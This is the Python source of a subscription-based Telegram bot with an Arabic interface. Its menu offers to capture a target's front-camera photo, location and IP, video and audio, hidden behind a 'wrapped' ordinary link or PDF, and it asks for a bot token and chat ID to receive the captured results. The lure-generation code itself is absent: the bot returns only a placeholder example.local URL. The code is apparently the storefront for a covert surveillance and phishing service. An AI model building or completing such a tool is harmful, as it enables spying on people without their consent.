# language: Python, file: bot.py, runtime: Python 3.10+, target: Telegram Bot API
import json
import os
import time
from datetime import datetime
import telebot
from telebot import types

BOT_TOKEN = os.getenv("SAM_BOT_TOKEN", "PUT_BOT_TOKEN_HERE")
ADMIN_ID = int(os.getenv("SAM_ADMIN_ID", "123456789"))
DB_FILE = "subscriptions.json"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
user_sessions = {}


def load_db() -> dict:
    if not os.path.exists(DB_FILE):
        return {"users": {}}
    try:
        with open(DB_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            if not isinstance(data, dict) or "users" not in data:
                return {"users": {}}
            return data
    except (json.JSONDecodeError, OSError):
        return {"users": {}}


def save_db(data: dict) -> None:
    tmp = f"{DB_FILE}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    os.replace(tmp, DB_FILE)


def check_sub(uid: int) -> tuple[bool, str]:
    if uid == ADMIN_ID:
        return True, "دائم (أدمن)"
    db = load_db()
    rec = db["users"].get(str(uid))
    if not rec:
        return False, ""
    exp = float(rec.get("expires_at", 0))
    now = time.time()
    if now >= exp:
        return False, ""
    days_left = int((exp - now) // 86400)
    exp_fmt = datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M")
    return True, f"{days_left} يوم ({exp_fmt})"


def menu_kb(uid: int) -> types.InlineKeyboardMarkup:
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("صورة وجه (كاميرا أمامية)", callback_data="feat_photo"),
        types.InlineKeyboardButton("تحديد موقع + IP", callback_data="feat_location"),
        types.InlineKeyboardButton("تسجيل مقطع فيديو", callback_data="feat_video"),
        types.InlineKeyboardButton("تسجيل صوتي", callback_data="feat_audio"),
    )
    kb.add(
        types.InlineKeyboardButton("تغليف رابط عادي", callback_data="mode_link"),
        types.InlineKeyboardButton("تغليف ملف PDF", callback_data="mode_pdf"),
    )
    if uid == ADMIN_ID:
        kb.add(
            types.InlineKeyboardButton("إضافة / تجديد اشتراك", callback_data="adm_add"),
            types.InlineKeyboardButton("إزالة اشتراك", callback_data="adm_rem"),
            types.InlineKeyboardButton("عرض المشتركين", callback_data="adm_list"),
        )
    return kb


def render_result(sess: dict) -> str:
    mode = sess.get("wrap_mode", "link")
    feat = sess.get("feature", "feat_photo")
    token = sess.get("target_token", "")
    chat_id = sess.get("target_chat_id", "")
    sid = f"{feat}_{int(time.time())}"
    token_short = f"{token[:10]}..." if len(token) > 10 else token

    if mode == "pdf":
        return (
            f"<b>تم تجهيز ملف PDF</b>\n"
            f"• النوع: <code>PDF</code>\n"
            f"• الميزة: <code>{feat}</code>\n"
            f"• آيدي الاستقبال: <code>{chat_id}</code>\n"
            f"• التوكن: <code>{token_short}</code>\n"
            f"• المعرف: <code>{sid}</code>\n"
            f"الحقوق: Sam | @lllIIlIlIl"
        )
    return (
        f"<b>تم تجهيز الرابط</b>\n"
        f"• النوع: <code>Link</code>\n"
        f"• الميزة: <code>{feat}</code>\n"
        f"• آيدي الاستقبال: <code>{chat_id}</code>\n"
        f"• التوكن: <code>{token_short}</code>\n"
        f"• المسار: <code>https://example.local/r/{sid}</code>\n"
        f"الحقوق: Sam | @lllIIlIlIl"
    )


@bot.message_handler(commands=["start"])
def on_start(message):
    uid = message.from_user.id
    ok, info = check_sub(uid)
    if not ok:
        bot.send_message(
            message.chat.id,
            "أنت غير مشترك في الخدمة.\nالحقوق: Sam | @lllIIlIlIl",
        )
        return
    bot.send_message(
        message.chat.id,
        f"<b>مرحباً بك</b>\n"
        f"الاشتراك: <code>{info}</code>\n"
        f"الحقوق: Sam | @lllIIlIlIl",
        reply_markup=menu_kb(uid),
    )


@bot.callback_query_handler(func=lambda call: True)
def on_callback(call):
    uid = call.from_user.id
    ok, _ = check_sub(uid)
    if not ok:
        bot.answer_callback_query(call.id, "أنت غير مشترك في الخدمة", show_alert=True)
        return

    user_sessions.setdefault(uid, {"wrap_mode": "link", "feature": "feat_photo", "step": None})
    data = call.data

    if data.startswith("feat_"):
        user_sessions[uid]["feature"] = data
        user_sessions[uid]["step"] = "wait_token"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "أرسل <b>توكن البوت</b> الخاص باستقبال النتائج:")
    elif data in ("mode_link", "mode_pdf"):
        user_sessions[uid]["wrap_mode"] = "pdf" if data == "mode_pdf" else "link"
        bot.answer_callback_query(call.id)
        label = "PDF" if data == "mode_pdf" else "رابط عادي"
        bot.send_message(
            call.message.chat.id,
            f"تم اختيار نمط التغليف: <b>{label}</b>\nالحقوق: Sam | @lllIIlIlIl",
            reply_markup=menu_kb(uid),
        )
    elif data == "adm_add" and uid == ADMIN_ID:
        user_sessions[uid]["step"] = "wait_add"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "أرسل: <code>USER_ID DAYS</code>\nمثال: <code>55667788 15</code>")
    elif data == "adm_rem" and uid == ADMIN_ID:
        user_sessions[uid]["step"] = "wait_rem"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "أرسل <code>USER_ID</code> لحذف اشتراكه:")
    elif data == "adm_list" and uid == ADMIN_ID:
        bot.answer_callback_query(call.id)
        db = load_db()
        if not db["users"]:
            bot.send_message(call.message.chat.id, "لا يوجد مشتركين مسجلين.")
            return
        now = time.time()
        out = ["<b>المشتركون:</b>"]
        for k, v in db["users"].items():
            exp = float(v.get("expires_at", 0))
            state = "ساري" if exp > now else "منتهي"
            dt = datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M")
            out.append(f"• <code>{k}</code> | {state} | <code>{dt}</code>")
        bot.send_message(call.message.chat.id, "\n".join(out))


@bot.message_handler(func=lambda m: True)
def on_text(message):
    uid = message.from_user.id
    ok, _ = check_sub(uid)
    if not ok:
        bot.send_message(
            message.chat.id,
            "أنت غير مشترك في الخدمة.\nالحقوق: Sam | @lllIIlIlIl",
        )
        return

    txt = (message.text or "").strip()
    sess = user_sessions.get(uid, {})
    step = sess.get("step")

    if step == "wait_add" and uid == ADMIN_ID:
        parts = txt.split()
        if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
            bot.send_message(message.chat.id, "أرسل بالصيغة: <code>USER_ID DAYS</code>")
            return
        target_id, days = parts[0], int(parts[1])
        exp = time.time() + (days * 86400)
        db = load_db()
        db["users"][target_id] = {"expires_at": exp}
        save_db(db)
        sess["step"] = None
        dt = datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M")
        bot.send_message(
            message.chat.id,
            f"تم تفعيل اشتراك <code>{target_id}</code> لمدة <b>{days}</b> يوم (حتى <code>{dt}</code>).",
            reply_markup=menu_kb(uid),
        )
        return

    if step == "wait_rem" and uid == ADMIN_ID:
        if not txt.isdigit():
            bot.send_message(message.chat.id, "أرسل <code>USER_ID</code> أرقام فقط.")
            return
        db = load_db()
        existed = db["users"].pop(txt, None)
        save_db(db)
        sess["step"] = None
        msg = f"تم حذف <code>{txt}</code>." if existed else "الآيدي غير موجود."
        bot.send_message(message.chat.id, msg, reply_markup=menu_kb(uid))
        return

    if step == "wait_token":
        sess["target_token"] = txt
        sess["step"] = "wait_chat_id"
        bot.send_message(message.chat.id, "أرسل الآن <b>آيدي حسابك</b> لاستقبال النتائج:")
        return

    if step == "wait_chat_id":
        if not txt.lstrip("-").isdigit():
            bot.send_message(message.chat.id, "أرسل آيدي حساب رقمياً صحيحاً.")
            return
        sess["target_chat_id"] = txt
        sess["step"] = None
        bot.send_message(message.chat.id, render_result(sess), reply_markup=menu_kb(uid))
        return


if __name__ == "__main__":
    bot.infinity_polling(skip_pending=True)
